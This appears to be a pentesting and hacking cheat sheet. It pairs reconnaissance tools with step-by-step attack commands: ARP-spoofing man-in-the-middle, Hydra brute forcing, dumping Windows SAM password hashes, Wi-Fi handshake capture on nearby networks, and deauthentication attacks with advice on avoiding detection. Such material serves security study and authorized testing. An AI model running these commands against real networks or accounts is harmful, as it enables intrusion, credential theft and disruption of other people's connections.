# Introduction to Hacking Library

The goal of this library is to create an archive of useful tools and how to use them, mostly for:

- Hacking
- Pentests 
- Security

Remember, this is only a guide, use the knowledge here wisely and at your own risk.

Have fun!

# Analysis Websites

## IPOK

A colection of online tools for analysis and diagnoses in domains, dns, email, network and servers.

- https://ipok.com.br/

## Have I Been Pwned

A site that checks if your email or phone is in a data breach.

- https://haveibeenpwned.com/

## How secure is my password?

A site that displays how secure is a password measured in time to crack it.

- https://www.security.org/how-secure-is-my-password/

# Cryptography

## Steghide

Steghide is steganography program which hides bits of a data file in some of the least significant bits of another file in such a way that the existence of the data file is not visible and cannot be proven.

It is designed to be portable and configurable and features hiding data in bmp, jpeg, wav and au files, blowfish encryption, MD5 hashing of passphrases to blowfish keys, and pseudo-random distribution of hidden bits in the container data.

**Hiding a file in an image:**

```console
steghide embed -cf {IMAGE} -ef {FILE_NAME}
```

Example:

```console
steghide embed -cf image.jpg -ef secret.txt
```

**Recovering text in an image:**

```console
steghide extract -sf {IMAGE}
```

Example:

```console
steghide extract -sf image.jpg
```

#### How to install

```console
sudo apt install steghide
```

# Hash Cracking

## Websites for crashing Hashs

- https://www.onlinehashcrack.com/ 

- https://hashes.com/

## Ophcrack

Password cracker designed for all operating systems that specializes in Windows password cracking. It works by using rainbow tables to try to crack the password.

After downloaded only open the program, add the LM/NT Hashes, add the rainbow tables that you have downloaded and click in start.

Not always it will find the key, but its certainly faster than other methods.

#### How to install

Download the program here:

https://ophcrack.sourceforge.io/

And download rainbow tables here:

https://ophcrack.sourceforge.io/tables.php 

## John the Ripper

## Hashcat


# Wordlist creation

List of scripts to help creating wordlists.

## CeWL (Custom Word List generator) 

CeWL is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper.

```console
cewl -w {FILE_TO_WRITE_PASSWORD} -d {DEPTH_NUM} -m {MINIMUM_PASSWORD_LENGTH} {IP_ADDRESS}
```

Example:

```console
cewl -w passwords.txt -d 2 -m 5 192.168.15.99
```

#### How to install

```console
sudo apt install cewl
```

#### Flags

- Let the spyder visit other sites:

> -o

- Lowercase all parsed words

> --lowercase

- Include email address:

> -e

- Output file for email addresses:

> --email_file {FILE_NAME}

- Show the count for each word found:

> -c

## Crunch

The wordlists are created through combination and permutation of a set of characters. You can determine the amount of characters and list size.

```console
crunch {MIN_WORD_SIZE} {MAX_WORD_SIZE} {CHARACTER_LIST} > {FILE_TO_SAVE_WORDLIST}
```

Example:

```console
crunch 3 4 qwerty123 > wordlist.txt
```

#### How to install

```console
sudo apt install crunch
```

## Cupp

Cupp is an interactive program that permutate the info gathered to create a wordlist.

```console
python3 cupp.py -i
```

#### How to install

Download the cupp repository at:

- https://github.com/Mebus/cupp

# Analysis Tools

## ARP

The ARP protocol (Address Resolution Protocol) associates every MAC address with an IP address in the local network. The way this works is with a broadcast in the local network, asking every host about their pairs IP/MAC. Every time a broadcast occurs the host sends his own pair IP/MAC besides asking other hosts their pairs, so it can be saved into a cache in every machine.

You can check the ARP cache in your own machine with:

```console
arp -a
```

Using ARP protocol you can either scan your local network to discover hosts, revealing their MAC addresses and internet adapter manufacturer:

```console
sudo arp-scan --interface=eth0 --localnet
```

or try to guess the OS of the hosts with:

```console
sudo arp-fingerprint -l
```

## TCPDUMP

TCPDUMP is a network analysis tool, it can be used for example with ARP Spoofing man in the middle, to analyze the traffic between host and victim.

- Base command:

```console
tcpdump -i eth0
```

#### Flags

Use the flags after the base command

- Traffic going in/out some IP:

> host {IP_ADDRESS}

- Filter traffic by entry or exit:

> src {IP_ADDRESS}

> dst {IP_ADDRESS}

- Filter traffic by port:

> port {PORT_NUM}

> portrange {PORT_START}-{PORT_END}

- Filter by package size:

> less {SIZE}

> greater {SIZE}

> <= {SIZE}

- Save to file:

> -w {FILE_NAME}

- Read file:

> -r {FILE_NAME}

## Wireshark

Wireshark is mostly used as an Sniffing tool to analise protocols when the computer send or receive packages, it can also be used with a Man in the Middle attack to analyze the traffic between host and victim.

#### Important Filters

Note that what is written here are only examples and not all the possibilities. So you can combine them and create your own filters based on your needs.  

- Filters packages sent or received by an IP address. Useful for analizing an especific computer:

> ip.addr==192.168.0.1

- Filters only the packages that this IP has sent:

> ip.src==192.168.0.1

- Filters only the packages that this IP will receive:

> ip.dst==192.168.0.1

- Filters tcp packages by an especific port. Useful when filtering the communication of an specific service: 

> tcp.port==xxx

- Filters tcp packages that cointains the term "google.com":

> tcp contains google.com

- Filters by udp protocol or tcp protocol: 

> udp or 

- Filters all dns packages:

> dns

- Filters all http packages:

> http

- Filters all HTTP GET and POST requests. It can show the most accessed webpages:

> http.request

- Filter http packages that contain the term .doc

> http contains .doc

- Filter http packages sent by the host:

> http.host

- Filter http packages sent by the server:

> http.server

- Displays all packets that contain the word ‘traffic’. Excellent when searching on a specific string or user ID:

> frame contains traffic 

- Service that provides mutual authentication between users and services in a network. Useful for finding logins:

> kerberos

## Nmap

```console
nmap {IP_ADDRESS}
```

Example:

```console
nmap 192.168.1.*
```

#### Ports state

The ports can be classified in 3 states:

- **Open** - Port is open accepting TCP conections or UDP packages.

- **Closed** - Port is closed but answers to Nmap packages, but there's no application listening to it.

- **Filtered** - Nmap doesn't know if is open or closed, because there's a package filter that don't let Nmap packages to reach the port.

#### Flags

- Port selection:

> -p 22,80-85,443,8000-8005,8080-8085

- Know port selection:

> -p ssh

- Agressive scan:

> -T5

- Discreet scan:

> -T0

- Save to file:

> -oN {FILENAME}

- Randomizes the port scan order by default to make detection slightly harder:

> -r

- Skip the ping test and simply scan every target host provided (helps finding hidden hosts):

> -Pn

- Display open TCP ports:

> -sT

- Display open UCP ports:

> -sU

- Display target system infos:

> -A

- Display target OS:

> -O

- Display version of services running in the ports:

> -sV

- Find vulnerabilities:

> --script vuln

- Find malwares or backdoors:

> --script malware

## Telnet

Telnet can be used to get the name and version of a process running in a specific port

```console
telnet {IP_ADDRESS} {PORT}
```

Example:

```console
telnet 192.168.1.1 22
```

## Nikto

Nikto is used to find vulnerabilities on web servers.

```console
nikto -host {IP_ADDRESS_OR_WEBSITE_DOMAIN} {OPTIONS}
```

Example:

```console
nikto -h 192.168.15.1 -Display 1
```

#### Options

- Show redirects:

> -Display 1

- Show cookies received:

> -Display 2

- Show all 200/OK responses:

> -Display 3

- Show URLs that need autentication:

> -Display 4

- Show debugging log:

> -Display D

- Show more detailed infos:

> -Display V

##### Scan tuning for Nikto:

- File upload:

> -Tuning 0

- Interesting File / Seen in logs:

> -Tuning 1

- Misconfiguration / Default File:

> -Tuning 2

- Information Disclosure:

> -Tuning 3

- Injection (XSS/Script/HTML):

> -Tuning 4

- Remote File Retrieval - Inside Web Root:

> -Tuning 5

- DOS (Denial Of Service):

> -Tuning 6

- Remote File Retrieval - Server Wide:

> -Tuning 7

- Remote shell / Command execution:

> -Tuning 8

- SQL injection:

> -Tuning 9

- Authentication Bypass:

> -Tuning a

- Software identification:

> -Tuning b

- Remote font inclusion:

> -Tuning c

- WebService:

> -Tuning d

- Administrative Console:

> -Tuning e

## NSLookup

Shows DNS servers of some website domain

```console
nslookup {WEBSITE_DOMAIN}
```

Example:

```console
nslookup www.google.com
```

## Webtech

Show tecnologies used in a webserver.

```console
./.local/bin/webtech -u {WEBSITE_DOMAIN}
```

Example:

```console
./.local/bin/webtech -u http://www.google.com
```

#### How to install

> pip install webtech

## WAF

Checks for WAF (Web Application FIrewall):

```console
wafw00f -a -v {WEBSITE_DOMAIN}
```

Example:

```console
wafw00f -a -v http://www.google.com
```

# Attack Tools

## ARP Spoofing

The objective of this attack is to add/replace some entries in the ARP table making the router believe that the attacker is in reality the victim and making the victim believe that the attacker is the router.

![ARP Spoofing Image](/img/ARP%20Spoofing.png)

### Enabling fowarding

First you need to enable fowarding of packets so the victim doesn't know that something happened.

___

#### Temporary fowarding

For temporary fowarding (this will disable fowarding when the machine is rebooted):

```console
sudo sysctl -w net.ipv4.ip_forward=1
```

or 

```console
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

___

#### Permanent fowarding

```console
sudo nano /etc/sysctl.conf
```

then find the line:

```
#Uncomment the next line to enable packet forwarding for IPv4
#net.ipv4.ip_forward=1
```

and delete the "#" in the second line:

```
#Uncomment the next line to enable packet forwarding for IPv4
net.ipv4.ip_forward=1
```

then

> Ctrl o

> Enter

> Ctrl x

and finally run this to apply the changes:

```console
sudo sysctl -p /etc/sysctl.conf
```

### Making a man in the middle with Arpspoof

To make this we will use this command two times:

```console
sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
```

___

#### First terminal

First to make the router think that our machine is the victim:

```console
sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
```

Example:

```console
sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
```

___

#### Second terminal

Then we make the victim think that our machine is the router:

```console
sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
```

Example:

```console
sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
```

and with this we have a man in the middle set.

## Hydra Password Cracking

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

```console
hydra -L {USER_LIST_FILE} -P {PASSWORD_LIST_FILE} {IP_ADDRESS} {PROTOCOL}
```

or

```console
hydra -l {USERNAME} -p {PASSWORD} {IP_ADDRESS} {PROTOCOL}
```

Example:

```console
hydra -l admin -P passwords.txt 192.168.15.99 ssh
```

#### Flags

- Restore a previous aborted/crashed session:

> -R

- Ignore an existing restore file (don't wait 10 seconds):

> -I 

- Perform an SSL connect:

> -S

- If the service is on a different default port, define it here:

> -s {PORT}

- Login with LOGIN name, or load several logins from FILE:

> -l {LOGIN}

> -L {FILE}

- Try password PASS, or load several passwords from FILE

> -p {PASS} 

> -P {FILE}

#### How to install

```console
sudo apt install hydra
```

## Burp Suite



## Windows local password cracking

Cracking a Windows password is a three-step process:

1. Acquiring the crypted password files
2. Uncrypting them
3. Cracking the Hashes

As an overview the method presented here starts by getting the files that hold the passwords hashes encrypted, then uncrypt them with Samdump2 getting the Hashes, and finally trying ways to crack this Hashes.

#### Getting SAM and SYSTEM files

Windows password hashes are stored in the SAM (Security Accounts Manager) file, however, they are encrypted with the system boot key, which is stored in the SYSTEM file. If we get access to both of these files, then the SYSTEM file can be used to decrypt the password hashes stored in the SAM file. 

They are in this directory: windows/system32/config . Unfornately this directory isn't accessible when Windows is running, so to get them you need to use some commands:

> reg save hklm\sam c:\sam

> reg save hklm\system c:\system

#### Getting password hashes with Samdump2

After you have both files we run Samdump2 to decrypt and get the Hashes.

```console
samdump2 -o {OUTPUT_FILE} {SYSTEM_FILE} {SAM_FILE}
```

Example:

```console
samdump2 -o hashes.txt SYSTEM SAM
```

The hashes you will get will be in this format:

> {USER}:{USER_ID}:{LM_HASH}:{NT_HASH}:::

For example:

> Maulem:1004:aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::

The LM Hash is older and easier to crack but sometimes (like this example) its value is an empty string which means we cannot use it to get the password.

The NT Hash (or NTLM in some cracking websites) is newer and more difficult to crash, but if cracking the LM didn't work this hash is the way.

#### Cracking the Hashes

There are a lot of ways to crack the Hashes, this Hashes are LM or NT (or NTLM) and can be cracked with:

- [Online Hash Cracking](#websites-for-crashing-hashs)

- [Ophcrack (Specialized in windows password cracking)](#ophcrack)

- [John the Ripper](#john-the-ripper)

- [Hashcat](#hashcat)

## WI-fi password cracking

Basically the process to crack wi-fi passwords consists in two parts, first you need to capture the wi-fi handshake from a device that has the password and then you need to crack the hash provenient from the handshake.

In this guide we will use Airmon tools to capture the Handshake and then there are a lot of tools for cracking the hashes.

#### Setting up Wlan interfaces

For this to work you need a Wlan interface to capture the Handshake, that means that if your PC only get internet through cable this won't work.

To show your interfaces use this command:

```console
iwconfig
```

![Wlan Interfaces Image](/img/Wlan%20Interfaces.png)

You should have at least one interface, named like wlan0 or wlan1.

In the next step if you use the interface that is connected to the internet you will **lose your internet connection until you restart the computer**, so if you only have 1 wlan interface you will need an ethernet cable to have connection to the internet.

To start searching for networks using your interface:

```console
sudo airmon-ng start {WLAN_INTERFACE_NAME}
```

For example:

```console
sudo airmon-ng start wlan0
```

If you see a message that says "Found processes that could cause trouble," run this to kill them:

```console
sudo airmon-ng check kill
```

Now if you run this command again it should show that the interface mode is now at Monitor mode and not in Managed mode

```console
iwconfig
```

![Wlan Managed Mode Image](/img/Wlan%20managed%20mode.png)

#### Discovering networks in your area

To discover 2.4G networks near you use this command (note that the Wlan interface name should have changed after the activation of the Monitor mode)

```console
sudo airodump-ng {WLAN_INTERFACE_MONITOR_NAME}
```

For example:

```console
sudo airodump-ng wlan0mon
```

To discover all networks including 5G near you use this command

```console
sudo airodump-ng --band ab {WLAN_INTERFACE_MONITOR_NAME}
```

For example:

```console
sudo airodump-ng --band ab wlan0mon
```

The disadvantage of discovering all networks instead the default ones is that your machine looks in more than 170 channels instead of 15 and this takes a lot more time to refresh th same network again.

Note that to get handshakes through 5G you will need to really be near the router.

#### Focusing on one network

Now that you have seen the networks in your area you need to choose one and get its BSSID and CH (channel).

Note that networks with lower values of PWR (power) means that the network is too far away and that lowers the possibilities to get a Handshake, try to pick the nearest network to -1 PWR or try walking near the router (the PWR value will increase).

In my experience the minimum power that i could get a handshake was -60 PWR and took over 2 days.

This command focus on a network, the -c (channel) is not mandatory neither --output-format but it helps on what we are trying to do:

```console
sudo airodump-ng -c {CHANNEL_NUM} -w {FILE_NAME} --output-format pcap -d {NETWORK_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
```

For example:

```console
sudo airodump-ng -c 6 -w cap --output-format pcap -d 98:7E:CA:AE:A9:DF wlan0mon
```

This command is the same in 2.4G and 5G networks, just watch that the same network has different BSSIDs for 2.4G and 5G.

![Capturing Handshake Image](/img/Capturing%20Handshake.png)

After running this command you should see something like this, the first part (1) show infos about the network that we are focusing, if no infos appear it means that either the network is off or the channel is wrong. A bug that i noticed is that the infos about some networks disappear after some time, the way that i supressed this was to not set an especific channel to focus.

The second part (2) show devices that are connected to the network, to capture a handshake either a new device (that has the password) can connect to the network or a connected device can disconnect and connect again.

You can passively wait for the handshake or you can try to disconnect devices from the network to capture the handshakes when they connect again, but this is risky because you can be detected by others doing it.

Also a lot of routers have security measures against deauthentication attacks nowadays.

[How to do a Deauth attack](#deauth-attack)

![Handshake Captured Image](/img/Handshake%20Captured.png)

After capturing the handshake something like this (1) should appear in the terminal.

If appear a PMKID instead of a Handshake it means that you are lucky because even without any users connecting to the network the Aircrack managed to get a PMKID that can be used to crack the password without the need of a handshake, in this case you need to extract the PMKID from the .cap file using hcxtool:

```console
hcxpcaptool -z {FILE_TO_SAVE_HASH_FROM_PMKID} {CAP_FILE}
```

For example:

```console
hcxpcaptool -z pmkid_hash.txt cap.cap
```

#### Cracking the password from the Handshake/PMKID

These tools can help you to crack Handshakes or PMKIDs:

- [Online Hash Cracking](#websites-for-crashing-hashs)

- [John the Ripper](#john-the-ripper)

- [Hashcat](#hashcat)


## Deauth Attack

The deauthentication attack tries to disconnect a user or all the users of a network, but it can be detected and a lot of routers have security measures against this kind of attack nowadays.

To try to hide your presence and not be detected by the security mecanisms the best is to set a number of tries (leaving in at 0 tries infinite times) and try to attack only one device at time. 

#### Disconecting a device

Note that the device BSSID can be found when [focusing on a network with airdump](#focusing-on-one-network), below "STATION" column.

```console
sudo aireplay-ng -0 {NUMBER OF TRIES} -a {NETWORK_BSSID} -c {DEVICE_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
```

For example:

```console
sudo aireplay-ng -0 20 -a 86:7E:CA:AE:A9:DE -c D4:F4:6F:C6:BE:2B wlan0mon
```

#### Disconecting all devices

```console
sudo aireplay-ng -0 {NUMBER OF TRIES} -a {NETWORK_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
```

For example:

```console
sudo aireplay-ng -0 0 -a 86:7E:CA:AE:A9:DE wlan0mon
```